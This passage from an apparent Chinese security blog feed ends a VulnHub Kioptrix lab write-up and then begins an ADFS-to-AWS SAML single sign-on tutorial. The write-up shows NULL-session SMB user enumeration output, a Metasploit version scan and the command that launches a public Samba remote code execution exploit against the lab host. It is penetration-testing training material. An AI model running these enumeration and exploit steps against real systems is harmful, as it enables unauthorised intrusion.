from polenum:</p><p>[+] Attaching to 192.168.199.230 using a NULL share</p><p>[+] Trying protocol 445/SMB…</p><pre><code>[!] Protocol failed: [Errno Connection error (192.168.199.230:445)] [Errno 111] Connection refused</code></pre><p>[+] Trying protocol 139/SMB…</p><pre><code>[!] Protocol failed: SMB SessionError: 0x5</code></pre><p>[+] Retieved partial password policy with rpcclient:</p><p>Password Complexity: Disabled<br>Minimum Password Length: 0</p><p> ================================= </p><h1 id="Groups-on-192-168-199-230"><a href="#Groups-on-192-168-199-230" class="headerlink" title="|    Groups on 192.168.199.230    |"></a>|    Groups on 192.168.199.230    |</h1><p>[+] Getting builtin groups:<br>group:[Administrators] rid:[0x220]<br>group:[Users] rid:[0x221]<br>group:[Guests] rid:[0x222]<br>group:[Power Users] rid:[0x223]<br>group:[Account Operators] rid:[0x224]<br>group:[System Operators] rid:[0x225]<br>group:[Print Operators] rid:[0x226]<br>group:[Backup Operators] rid:[0x227]<br>group:[Replicator] rid:[0x228]</p><p>[+] Getting builtin group memberships:<br>Group ‘Administrators’ (RID: 544) has member: Couldn’t find group Administrators<br>Group ‘System Operators’ (RID: 549) has member: Couldn’t find group System Operators<br>Group ‘Backup Operators’ (RID: 551) has member: Couldn’t find group Backup Operators<br>Group ‘Account Operators’ (RID: 548) has member: Couldn’t find group Account Operators<br>Group ‘Power Users’ (RID: 547) has member: Couldn’t find group Power Users<br>Group ‘Guests’ (RID: 546) has member: Couldn’t find group Guests<br>Group ‘Users’ (RID: 545) has member: Couldn’t find group Users<br>Group ‘Print Operators’ (RID: 550) has member: Couldn’t find group Print Operators<br>Group ‘Replicator’ (RID: 552) has member: Couldn’t find group Replicator</p><p>[+] Getting local groups:<br>group:[sys] rid:[0x3ef]<br>group:[tty] rid:[0x3f3]<br>group:[disk] rid:[0x3f5]<br>group:[mem] rid:[0x3f9]<br>group:[kmem] rid:[0x3fb]<br>group:[wheel] rid:[0x3fd]<br>group:[man] rid:[0x407]<br>group:[dip] rid:[0x439]<br>group:[lock] rid:[0x455]<br>group:[users] rid:[0x4b1]<br>group:[slocate] rid:[0x413]<br>group:[floppy] rid:[0x40f]<br>group:[utmp] rid:[0x415]</p><p>[+] Getting local group memberships:</p><p>[+] Getting domain groups:<br>group:[Domain Admins] rid:[0x200]<br>group:[Domain Users] rid:[0x201]</p><p>[+] Getting domain group memberships:<br>Group ‘Domain Users’ (RID: 513) has member: Couldn’t find group Domain Users<br>Group ‘Domain Admins’ (RID: 512) has member: Couldn’t find group Domain Admins</p><p> ========================================================================== </p><h1 id="Users-on-192-168-199-230-via-RID-cycling-RIDS-500-550-1000-1050"><a href="#Users-on-192-168-199-230-via-RID-cycling-RIDS-500-550-1000-1050" class="headerlink" title="|    Users on 192.168.199.230 via RID cycling (RIDS: 500-550,1000-1050)    |"></a>|    Users on 192.168.199.230 via RID cycling (RIDS: 500-550,1000-1050)    |</h1><p>[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623<br>[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username ‘’, password ‘’<br>S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\<br>                                                        (0)<br>S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)<br>S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)<br>S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)<br>S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)</p><p> ================================================ </p><h1 id="Getting-printer-info-for-192-168-199-230"><a href="#Getting-printer-info-for-192-168-199-230" class="headerlink" title="|    Getting printer info for 192.168.199.230    |"></a>|    Getting printer info for 192.168.199.230    |</h1><p>No printers returned.</p><p>enum4linux complete on Sun Oct 13 04:23:51 2019</p><p>root@kali:~#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">看了其他人写的writeup，正常可以拿到samba的版本号，但是我这个拿不到，还报了个错误：</span><br></pre></td></tr></table></figure></p><p>Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">翻了下kali的bug tracker也提到了这个问题（测试了下缓解方法[https://bugs.kali.org/view.php?id=4495](https://note.youdao.com/)），没成，似乎是smbclient的一个bug？</span><br><span class="line"></span><br><span class="line">msf试试：</span><br></pre></td></tr></table></figure></p><p>msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.199.230<br>RHOSTS =&gt; 192.168.199.230<br>msf5 auxiliary(scanner/smb/smb_version) &gt; set THREADS 16<br>THREADS =&gt; 16<br>msf5 auxiliary(scanner/smb/smb_version) &gt; run<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image](6A59DF9ED4B5423CBA84907B0E17B373)</span><br><span class="line"></span><br><span class="line">可以直接识别出版本为Samba 2.2.1a</span><br><span class="line"></span><br><span class="line">直接上exploit：[Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10)</span><br><span class="line">![image](4FDF5B01D3284CD0B879D05711E3A340)</span><br><span class="line"></span><br><span class="line">Capturing The Flag!</span><br></pre></td></tr></table></figure></p><p>./10 -b 0 192.168.199.230<br><code>`</code></p><p><img src="85B62A2212A647EE89F75DF787004195" alt="image"></p><h2 id="0x04-待解决的问题"><a href="#0x04-待解决的问题" class="headerlink" title="0x04 待解决的问题"></a>0x04 待解决的问题</h2><ul><li>Kali 2019.03 smbclient bug导致不能识别smb版本的问题，提到Kali的<a href="https://bugs.kali.org/view.php?id=5739" target="_blank" rel="noopener">bug tracker</a>了。</li></ul><h2 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h2><p>好多expolit code比较老了，0几年的，在现在用的系统上经常出现依赖库版本兼容性问题导致报错，烦躁。</p><p>顺便提交了一个kali 2019.03上头smbclient不能获取smb service version info的bug，详细信息见kali的bug tracker：<a href="https://bugs.kali.org/view.php?id=5739" target="_blank" rel="noopener">It seems that the version bug of smbclient causes no way to enumerate the smb service version.</a>。</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><ul><li><a href="https://www.vulnhub.com/series/kioptrix,8/" target="_blank" rel="noopener">Kioptrix</a></li><li><a href="https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html" target="_blank" rel="noopener">netdiscover</a></li><li><a href="https://blog.bladeism.com/kioptrix-level-1/" target="_blank" rel="noopener">Kioptrix Level 1</a></li><li><a href="https://nmap.org/book/man.html" target="_blank" rel="noopener">Chapter 15. Nmap Reference Guide</a></li><li><a href="https://volta-sec.blogspot.com/2017/02/kioptrix-level-1-via-web-vuln.html" target="_blank" rel="noopener">Kioptrix Level 1 (Via Web Vuln)</a></li><li><a href="https://security.stackexchange.com/questions/31854/what-does-pn-option-mean-in-nmap" target="_blank" rel="noopener">What does -Pn option mean in nmap? [closed]</a></li><li><a href="https://bugs.kali.org/view.php?id=4495" target="_blank" rel="noopener">Kali Linux Bug Tracker</a></li><li><a href="https://github.com/portcullislabs/enum4linux/issues/5" target="_blank" rel="noopener">Use of uninitialized value $os_info in concatenation (.) or string at /bin/enum4linux line 464.</a></li><li><a href="https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/" target="_blank" rel="noopener">Compiling exploit 764.c in 2017 (using libssl-dev 1.1.0f )</a></li><li><a href="https://bugs.kali.org/view.php?id=5739" target="_blank" rel="noopener">It seems that the version bug of smbclient causes no way to enumerate the smb service version.</a></li><li><a href="https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/" target="_blank" rel="noopener">Scanner SMB Auxiliary Modules</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;准备写一个撸Vulnhub的系列教程，从Kioptrix系列开始，相关链接在这里：&lt;a href=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何配置ADFS使域账号可以登陆多个AWS账户</title>
    <link href="https://tonghuaroot.com/2019/10/08/ADFS-SAML-Integrated-AWS-China/"/>
    <id>https://tonghuaroot.com/2019/10/08/ADFS-SAML-Integrated-AWS-China/</id>
    <published>2019-10-08T21:36:23.000Z</published>
    <updated>2019-10-09T05:37:23.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在这篇文章中，我将以中国区AWS为例，向大家介绍如何配置ADFS，使其可以登陆多个AWS账号，以此来简化日常多账号的身份管理及访问控制。<br>这篇文章的定位为对活动目录有一个简单了解的同学，当然即使不了解也没有关系。我会一步步的从域控的搭建到ADFS搭建及配置为大家介绍。</p><h2 id="0x01-准备材料"><a href="#0x01-准备材料" class="headerlink" title="0x01 准备材料"></a>0x01 准备材料</h2><ul><li>ami:Microsoft Windows Server 2016 Base (Chinese Simplified) - ami-0f525133ce76914c1</li></ul><h2 id="0x02-教程大纲"><a href="#0x02-教程大纲" class="headerlink" title="0x02 教程大纲"></a>0x02 教程大纲</h2><ul><li>如何搭建域控制器</li><li>如何安装ADFS服务</li><li>如何配置ADFS服务使其支持多AWS账号登陆</li><li>常见的故障排查方法</li></ul><h2 id="0x03-如何搭建域控制器"><a href="#0x03-如何搭建域控制器" class="headerlink" title="0x03 如何搭建域控制器"></a>0x03 如何搭建域控制器</h2><ul><li>先起来了一台2016的实例，完事分配了一个EIP，因为搭建各种服务器的过程中可能会涉及到重启服务器的情况，如果不使用EIP的话，IP重启后会更换，一来避免每次都要查看，二来也是避免IP更换后导致的非预期报错。</li><li>然后关闭服务器的【IE增强的安全配置】选项，避免有些打开浏览器的操作需要频繁弹窗，操作步骤可以参考下面图片：</li></ul><p><img src="497A2B8C5F8F404F8D4E69890DE50951" alt="image"></p><p><img src="CF88B9E343F34870B453C2680EC6AD0F" alt="image"></p><p><img src="06222CEF68DA4619AC6676C44E8F1B7B" alt="image"></p><ul><li>做好上面的准备工作，下面就可以搭建域控了。</li></ul><p><img src="D345BFDBDFCE4151BF07E3AF3803A41E" alt="image"></p><p><img src="1717FBE292FD4B8CB5435B7B4B7F274B" alt="image"></p><p><img src="1B280ACCAC4F4323B0D5D385BE86E567" alt="image"></p><p><img src="B2F9C68EB40F4EF3ACB6B843CC4EF109" alt="image"></p><p><img src="AD4A36DCA2274D899C3F61399C3F65CE" alt="image"></p><p><img src="305F05AC8D7A4980AC4D16743D5D06F9" alt="image"></p><p><img src="0B41C8843F034821B34F42BE50B83177" alt="image"></p><p><img src="53DEECC3A2FE42D69B8A78E3FCA45788" alt="image"></p><p>点击完【安装】之后一直等着就行了。</p><p><img src="FE312D4F95114E9C9584288C18E38FD8" alt="image"></p><p>功能安装完成之后点击关闭。</p><p><img src="4E6CEBCA5EFF4FBAB03EA6B05D5A769E" alt="image"></p><p>然后接着运行【部署向导】</p><p><img src="3474E032D0C6428E9C15400C56FB7BC3" alt="image"></p><p>因为我们创建的是一个新的域环境，所以此处选择【添加新林】</p><p><img src="A944612C28544E6B9892CF5BD0DE28BA" alt="image"></p><p>此处设置DSRM密码，然后点击下一步</p><p><img src="5B655245E71B423EBD1C2FBC5D41C928" alt="image"></p><p><img src="80E48491507E4DD09823517BC3B03C6D" alt="image"></p><p><img src="0AEB99CDF7EB4942A624F2AEBE3B540D" alt="image"></p><p><img src="467D435928EC420BA8A1574F4F08AEBB" alt="image"></p><p><img src="EAD56110B65E471CA86A578DF88702FB" alt="image"></p><p>接下来，点击【安装】</p><p><img src="CA13655112F1467A910342860C239CC8" alt="image"></p><p>这个时候稍等一会服务器就会自动重启了。待会重新登陆的时候也会比较慢，因为涉及到派发组策略什么的，需要一定的时间。（这个时候域控就建好好了），至于域账号以及分组什么的之后搭ADFS的时候再创建。</p><p>算了还是先建个域管账号吧。打开【服务器管理器】，点击【工具】，点击【Active Directory 用户和计算机】，可以看到如下页面：</p><p><img src="3F366C2D860448B7BD8FEB397E76A5F7" alt="image"></p><p>右键选择【新建】，选择【用户】：</p><p><img src="CEC9674E2E6741F9903B1F4460F93D09" alt="image"></p><p>配置账号密码等相关信息，点击下一步：</p><p><img src="A4B50145582847AF854A2DAB03716498" alt="image"></p><p><img src="35D37B1EDDDB4BD5B46405DCA0ABC484" alt="image"></p><p>右键选择用户，选择【添加到组】，组名选择【Domain Admins】</p><p><img src="CA7DBC419F1444B287D780E3DFCFC449" alt="image"></p><p>可以看到使用新创建的域管已经可以登录到域控了。</p><p><img src="10AB48341599438988911B2C8C3CD329" alt="image"></p><p>至此，域控制器搭建完成。</p><h2 id="0x04-如何安装ADFS服务"><a href="#0x04-如何安装ADFS服务" class="headerlink" title="0x04 如何安装ADFS服务"></a>0x04 如何安装ADFS服务</h2><p>跟搭建域控的时候差不多，选择【添加角色或功能】，选择【下一步】</p><p><img src="E0DA154F8AE4417C952F2E25CA51121F" alt="image"></p><p><img src="0C44BF27A4B4474D8AB6B223A904B557" alt="image"></p><p><img src="1D913D45A37E41348720FA008210638C" alt="image"></p><p>选择【Active Directory 联合身份验证服务】，选择【下一步】</p><p><img src="0F4CF611EA3A4031B8ED65986A8C1FC8" alt="image"></p><p><img src="DDA16183433A4E198074936A6CE9ABE6" alt="image"></p><p><img src="A1500C59F27C4B95AF17BA7D9B5283CA" alt="image"></p><p><img src="FC9CB14A9AA840D0B9BC73DAC97B0652" alt="image"></p><p>安装成功后，点击【关闭】即可。</p><p>ADFS服务安装完成之后，还要顺便安装IIS自签名证书。</p><p>搭建IIS服务器（持续下一步，然后点击安装即可）：</p><p><img src="79E9E922B9104C15BDC04C2383BC39CC" alt="image"></p><p>安装完成后大概长这样：</p><p><img src="BB19DDD3379747BA8DFF89D2CC8F9EA7" alt="image"></p><p>然后开始创建自签名证书：</p><p><img src="AEC82BE8D2BF4C6EB09437871B0ADC9D" alt="image"></p><p><img src="3B36AF0580624F0D87F0990DC8CA9133" alt="image"></p><p><img src="36EA0625D1894C199A6AD450A2FD5EC0" alt="image"></p><p>部署ADFS服务：</p><p><img src="84AB1DFA24BA40ABB566D760F0A9C8E0" alt="image"></p><p><img src="A446146BBFB6470F9BCE2DCFAA264EE3" alt="image"></p><p>这个步骤中，证书用的是之前导出来的自签名证书</p><p><img src="55CEF39BD67D462099F26902E8C37968" alt="image"></p><p>设置一个服务账户</p><p><img src="68C62E4AF8E1494F93C4360ED1C9706D" alt="image"></p><p><img src="7B933DDF5F324BA084256CEB39A9D9AB" alt="image"></p><p><img src="D248370D9BC64675B584A20E3113EFAD" alt="image"></p><p><img src="C9EF2BAC429A4CF183B898F1C1099819" alt="image"></p><p>选择关闭，再重启下服务器。</p><p><img src="DCB41D1FFA4B4E2181D335FCA058CEE6" alt="image"></p><h2 id="0x05-如何配置ADFS服务使其支持多AWS账号登陆"><a href="#0x05-如何配置ADFS服务使其支持多AWS账号登陆" class="headerlink" title="0x05 如何配置ADFS服务使其支持多AWS账号登陆"></a>0x05 如何配置ADFS服务使其支持多AWS账号登陆</h2><ul><li>先下个firefox浏览器，IE太难用了。</li></ul><p>访问这个链接：<a href="https://localhost/adfs/ls/IdpInitiatedSignOn.aspx" target="_blank" rel="noopener">https://localhost/adfs/ls/IdpInitiatedSignOn.aspx</a><br>就可以看到ADFS的登陆页面了，报错的原因是因为我们还没有做相关配置。</p><p><img src="65A63D2544D24618A917BC40C61A29D4" alt="image"></p><p>接下来先把ADFS的metadata下载下来，一会要用到：<a href="https://localhost/FederationMetadata/2007-06/FederationMetadata.xml" target="_blank" rel="noopener">https://localhost/FederationMetadata/2007-06/FederationMetadata.xml</a></p><p>在AWS IAM控制台（<a href="https://console.amazonaws.cn/iam/home?region=cn-north-1#/providers）中创建【身份提供商】，metadata就是刚刚下载到的。" target="_blank" rel="noopener">https://console.amazonaws.cn/iam/home?region=cn-north-1#/providers）中创建【身份提供商】，metadata就是刚刚下载到的。</a></p><p><img src="D222E5AC3B5D4EA595E2708C5CBF3C3F" alt="image"></p><p><img src="D58FE6C5EC054168AE24B15F3EBB6ACE" alt="image"></p><p>接下来创建对应的role，role名称为：ADFS-Admin-Tonghua</p><p>然后回到ADFS，配置ADFS。</p><p>右键选择【ADFS】，选择【添加信赖方信任】<br><img src="5F125C0B5C1946A184594206DCF7A2BD" alt="image"></p><p>选择【启动】，然后添加AWS metadata</p><p><img src="D8C8EB689E3C419BB23131821E36BC4F" alt="image"></p><p>选择【下一步】</p><p><img src="5B866DE422F544DC96BB9BEC24AD6CB4" alt="image"></p><p><img src="84E47B5EE9C342CF88C0190356A428E2" alt="image"></p><p><img src="D106F0521210472394CA44FCCCDD1246" alt="image"></p><p>配置完成后，剩下的就是配置各种声明颁发策略了：</p><p><img src="7AC5C83373F04D96BF1E91E14D722837" alt="image"></p><p><img src="94702A8EF70B4B4BA0D05B5CFCE7DA11" alt="image"></p><p>注意各种声明的格式要一一对上。</p><p>第一条规则配置完成后再继续配置第二条规则：</p><p><img src="E310D7A053164F5C881BEEEBC319D37C" alt="image"></p><p>传入声明类型设置为：<a href="https://aws.amazon.com/SAML/Attributes/RoleSessionName" target="_blank" rel="noopener">https://aws.amazon.com/SAML/Attributes/RoleSessionName</a></p><p><img src="A55FBAE06B7648BFA6ABF3CE04764008" alt="image"></p><p>接下来配置第三条规则：</p><p><img src="BC36AD7C276746AC9DCB9C1EBF1B9479" alt="image"></p><p>自定义规则的内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:[Type == &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&quot;, Issuer == &quot;AD AUTHORITY&quot;]</span><br><span class="line">=&gt; add(store = &quot;Active Directory&quot;, types = (&quot;http://temp/variable&quot;), query = &quot;;tokenGroups;&#123;0&#125;&quot;, param = c.Value);</span><br></pre></td></tr></table></figure></p><p><img src="2F5274AB61084596BFE3A1ECC1716AE7" alt="image"></p><p>第四条规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:[Type == &quot;http://temp/variable&quot;, Value =~ &quot;(?i)^AWS-([\d]&#123;12&#125;)&quot;]</span><br><span class="line"> =&gt; issue(Type = &quot;https://aws.amazon.com/SAML/Attributes/Role&quot;, Value = RegExReplace(c.Value, &quot;AWS-([\d]&#123;12&#125;)-&quot;, &quot;arn:aws-cn:iam::$1:saml-provider/AWSADFS,arn:aws-cn:iam::$1:role/&quot;));</span><br></pre></td></tr></table></figure></p><p><img src="B3D5262F15F9468DA193908C6393D28A" alt="image"></p><p>注意替换里头的ARN，组名前缀一类的。</p><p>保存应用即可。</p><p>然后在powershell里执行如下命令（开启ADFS的登陆页，不然会报个错误）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-AdfsProperties -EnableIdPInitiatedSignonPage $true</span><br></pre></td></tr></table></figure></p><p><img src="84DCA3583C3442389C5819E57D944235" alt="image"></p><p>再去AD中创建个组，把用户添加到组中。</p><p><img src="0E1EAA502AEC4C3497549ABB23C2E968" alt="image"></p><p>这个的组名和AWS的role名要对应上。把用户添加到这个组里头。用户也要配置一个电子邮件，用于生产rolesessionname用，否则会报错。</p><p><img 